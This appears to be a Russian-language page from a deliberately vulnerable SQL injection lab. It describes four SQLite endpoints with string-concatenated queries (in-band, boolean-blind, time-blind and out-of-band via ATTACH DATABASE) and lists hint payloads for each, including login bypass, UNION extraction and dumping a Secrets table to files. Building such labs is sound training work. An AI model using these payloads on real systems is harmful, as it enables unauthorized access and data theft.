In-band SQLi /api/login

Конкатенация строк в запросе SELECT * FROM Users WHERE username='...' AND password='...'. Утечка текста ошибок SQLite. Возможны auth bypass, UNION-based и error-based инъекции.

Подсказки / payload'ы
' OR 1=1-- -
admin'-- -
x' UNION SELECT id, secret_usser, secret_usser FROM Secrets-- -
x' UNION SELECT 1, sqlite_version(), 3-- -

Blind Boolean SQLi /api/check_user

Конкатенация строк в SELECT id FROM Users WHERE id='...'. Ответ различается по полю result: true/false — можно посимвольно извлекать данные. 

// ответ появится здесь
Подсказки / payload'ы
1
1' AND 1=1-- -
1' AND 1=2-- -
1' AND substr((SELECT secret_usser FROM Secrets LIMIT 1),1,1)='a'-- -
1' AND (SELECT length(secret_usser) FROM Secrets LIMIT 1)>3-- -

Blind Time SQLi /api/check_user_slow

Конкатенация в SELECT COUNT(*) FROM Users WHERE username='...'. Ответ возвращается с задержкой — можно угадывать данные по времени ответа. В SQLite нет SLEEP(), но есть тяжёлые запросы (например, рекурсивный CTE или randomblob). 

// ответ (время) появится здесь
Подсказки / payload'ы
admin
' OR 1=1-- -
' OR (SELECT length(randomblob(100000000)))>0 AND 1=1-- -
' OR (WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<500000) SELECT count(*) FROM c)>0-- -

Out-of-Band SQLi /api/oob

Используется executescript (множественные SQL-запросы) и ATTACH DATABASE для записи данных в файл в папке oob_channel/. Сервер затем читает эту папку и отдаёт содержимое в JSON. Классический OOB-канал: атака идёт через SQL, а данные утекают через файловую систему. 

// ответ появится здесь
Подсказки / payload'ы
admin'; ATTACH DATABASE 'oob_channel/leak.db' AS leak; CREATE TABLE leak.d(x); INSERT INTO leak.d SELECT secret_usser FROM Secrets; --
admin'; ATTACH DATABASE 'oob_channel/leak2.db' AS l2; CREATE TABLE l2.s AS SELECT * FROM Secrets; --
admin'; ATTACH DATABASE 'oob_channel/users.db' AS u; CREATE TABLE u.t AS SELECT * FROM Users; --
